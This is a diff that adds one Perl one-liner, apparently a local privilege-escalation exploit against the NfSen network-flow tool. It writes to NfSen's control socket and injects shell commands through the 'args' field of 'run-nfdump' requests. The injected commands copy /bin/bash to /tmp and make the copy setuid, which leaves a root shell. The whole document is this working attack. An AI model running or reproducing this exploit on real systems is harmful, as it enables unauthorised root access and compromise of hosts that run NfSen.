@@ -1,0 +1,1 @@
+perl -e 'use Socket; socket(my $nfsend, AF_UNIX, SOCK_STREAM, 0); connect($nfsend, sockaddr_un("/var/nfsen/run/nfsen.comm")); print $nfsend "run-nfdump\nargs=-h \$(bash -c \"cp /bin/bash /tmp\")\n.\nrun-nfdump\nargs=-h \$(bash -c \"chmod u+s /tmp/bash\")\n.\n";'
